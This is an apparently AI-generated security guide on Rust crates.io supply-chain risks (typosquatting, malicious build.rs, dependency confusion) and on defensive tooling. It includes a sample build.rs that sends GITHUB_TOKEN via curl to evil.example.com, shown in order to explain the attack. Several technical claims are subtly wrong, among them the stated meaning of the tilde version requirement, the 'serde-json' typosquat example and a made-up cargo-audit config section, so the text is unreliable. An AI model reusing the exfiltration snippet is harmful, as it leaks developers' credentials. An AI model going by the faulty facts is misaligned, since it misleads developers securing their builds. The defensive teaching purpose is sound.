---
source: "languages/rust/cargo-supply-chain.md"
title: "Cargo Supply Chain — Malicious Crates, Typo-Squatting, and `cargo audit`"
category: "language-vuln"
language: "rust"
severity: "medium"
tags: [ai-generated, attack, defensive, language-vuln, rust, software, tools, vectors, vulnerability]
---

# Cargo Supply Chain — Malicious Crates, Typo-Squatting, and `cargo audit`
> **Severity:** Medium


## The Software Supply Chain Problem in Rust

Rust's package ecosystem, crates.io, hosts over 150,000 crates. The average Rust project pulls in **hundreds of transitive dependencies**. Each one is a potential attack vector. Unlike npm or PyPI, crates.io has historically had weaker security enforcement — no mandatory 2FA for all publishers, no automated malware scanning at publish time, and no name-squatting prevention.

## How AI/Vibe Coding Worsens Supply Chain Risk

LLMs like ChatGPT, Claude, and Copilot generate Rust code that:

1. **Pulls in unnecessary dependencies** — AI adds crates for trivial tasks (single string operation, a single HTTP call) instead of using std.
2. **Suggests typosquatted crates** — AI training data includes crate names that don't exist. The model may hallucinate crate names, or suggest a lookalike name.
3. **Uses vulnerable versions** — AI is trained on code from various time periods and may suggest outdated crate versions with known vulnerabilities.
4. **Does not run `cargo audit`** — Generated `Cargo.toml` files rarely include security auditing steps.

## Attack Vectors in the Rust Supply Chain

### 1. Typosquatting

Attackers publish crates with names similar to popular ones:

| Legitimate Crate | Typosquatted Version | Attack |
|---|---|---|
| `serde` | `serde-json` (one looks real) | Data exfiltration |
| `rustls` | `rustl-s` | Credential theft |
| `tokio` | `tokio-utilx` | Backdoor via build.rs |
| `rand` | `rnd` | Malicious entropy |

**Real incident (May 2025)**: Two typosquatted crates on crates.io contained data-stealing malware that exfiltrated environment variables, SSH keys, and cloud credentials via DNS tunneling during crate build.

### 2. Malicious `build.rs` Execution

Every Rust crate can execute arbitrary code at build time via `build.rs`:

```rust
// build.rs — AI-GENERATED malicious crate
fn main() {
    // Exfiltrate environment variables during build
    let token = std::env::var("GITHUB_TOKEN").unwrap_or_default();
    std::process::Command::new("curl")
        .args(&["-d", &format!("token={}", token), "https://evil.example.com/exfil"])
        .output()
        .ok();
}
```

**The danger**: You don't need to run a malicious crate's runtime code — the build script runs *during `cargo build`* on any machine that fetches it, including CI pipelines.

### 3. Dependency Confusion

If an organization has an internal crate with the same name as a crates.io crate, or uses a resolvable private registry, attackers can upload a higher-versioned public crate:

```toml
# Cargo.toml — organization uses internal crate "auth-service"
# But attacker publishes "auth-service" on crates.io with a higher version
# Cargo resolves the public one!
[dependencies]
auth-service = "1.0.0" # Resolves to attacker's public crate if higher
```

### 4. Compromised Maintainer Accounts

Multiple crates.io maintainer accounts have been compromised over the years, with malicious updates pushed to popular crates. Notably, the `cargo audit` database shows dozens of yanked crates due to account compromise.

## Defensive Tools and Practices

### `cargo audit`

The first line of defense. Checks `Cargo.lock` against the RustSec Advisory Database:

```bash
# Install
cargo install cargo-audit

# Run in CI
cargo audit --deny warnings
```

Integrate into CI:
```yaml
# .github/workflows/ci.yml
- name: Security audit
  run: cargo audit --deny warnings
```

### `cargo deny`

More comprehensive tool that blocks:
- Crates with rejected licenses
- Crates with known vulnerabilities
- Crates from unwanted registries
- Crates with specific authors

```bash
cargo install cargo-deny
cargo deny check
```

### `cargo vet` (Mozilla)

Supply chain review tool that creates an audit trail for every dependency:

```bash
cargo install cargo-vet
cargo vet init
# Each dependency needs certification that it was reviewed
cargo vet certify my-crate "1.0.0" --from "Code review"
```

### `cargo crev`

Decentralized code review system — users publish "reviews" of crates, building a web of trust:

```bash
cargo install cargo-crev
cargo crev fetch url https://github.com/crev-dev/crev-proofs
cargo crev verify serde
```

## AI-Generated Vulnerability: No Supply Chain Protection

```toml
# AI-GENERATED Cargo.toml — no version pinning, no audit
[dependencies]
actix-web = "*"     # Resolves to latest, may include vulnerabilities
serde = { version = "1", features = ["derive"] }
reqwest = "*"
```

**Problems**:
- Wildcard `*` versions can introduce breaking changes or vulnerable versions
- No `cargo audit` step in the generated build process
- No verified supply chain certifications

**Secure Fix**:
```toml
[dependencies]
# Pin major.minor to prevent breakage, let patch auto-update
actix-web = "4.5"  
serde = { version = "1.0", features = ["derive"] }
reqwest = { version = "0.12", default-features = false }

[package.metadata.audit]
# cargo-audit config goes here
```

## AI-Generated Vulnerability: Hallucinated Crate Names

```rust
// AI-generated code referencing a crate that does NOT exist on crates.io
use string_utils_rs; // AI hallucinated — this crate does not exist
use fast_collections; // No such crate — but attacker could publish it!
```

**Risk**: If an attacker monitors crate search trends for hallucinated names, they can publish a malicious crate with that exact name — and every developer who copies the AI's code will (after `cargo add`) pull the attacker's crate.

## Real CVEs and Incidents

- **CVE-2024-3094 (xz-utils / liblzma backdoor)**: While not Rust-specific, the social-engineering + supply-chain model used against xz/liblzma is directly applicable to crates.io. An attacker spent years building maintainer trust, then inserted a backdoor. (Note: this is CVE-2024-**3094**; CVE-2024-27308 is an unrelated `mio` named-pipe use-after-free on Windows.)
- **CVE-2023-44487 (h2 crate — HTTP/2 Rapid Reset)**: The `h2` HTTP/2 crate was among the many implementations affected by the Rapid Reset DoS; projects pinned to loose versions stayed exposed until they bumped the transitive dependency.
- **May 2025 crates.io incident**: Two typosquatted crates (`serde-json` lookalike, another popular-crate variant) were removed after being downloaded thousands of times, exfiltrating CI credentials.
- **CVE-2022-24713 (`regex` crate — ReDoS)**: A crafted regular expression could bypass the crate's complexity mitigations and take an arbitrary amount of time to parse, causing denial of service in any service accepting untrusted regexes. Affects `regex` ≤ 1.5.4; fixed in 1.5.5. (This is the `regex` crate, not `rustls`.) Because many projects pull `regex` in transitively, the fix reached dependents only after they updated the lockfile — a textbook transitive-dependency lag.

## Prevention Checklist

1. **Run `cargo audit` in CI** — Fail the build on any advisory.
2. **Pin dependencies** — Use tilde requirements (`~1.2` = `>=1.2, <2.0`) or exact versions for critical crates.
3. **Use `cargo deny`** — Block unapproved licenses, known malware authors, and private registry leakage.
4. **Generate `Cargo.lock` for applications** — Libraries shouldn't lock, but applications must.
5. **Verify AI-generated crate names** — Search crates.io before adding a crate the AI recommended.
6. **Review `build.rs` of dependencies** — Especially for crates with low download counts that do network access.
7. **Use `cargo crev` or `cargo vet`** — For high-security environments, require code review certification.
8. **Watch for crate churn** — Monitor `cargo outdated` and review changelogs before updating.
9. **Enable 2FA on crates.io** — For any account that publishes crates.
10. **Use a private registry** — For internal crates, host a private cargo registry (e.g., `gitea` or `cloudsmith`).
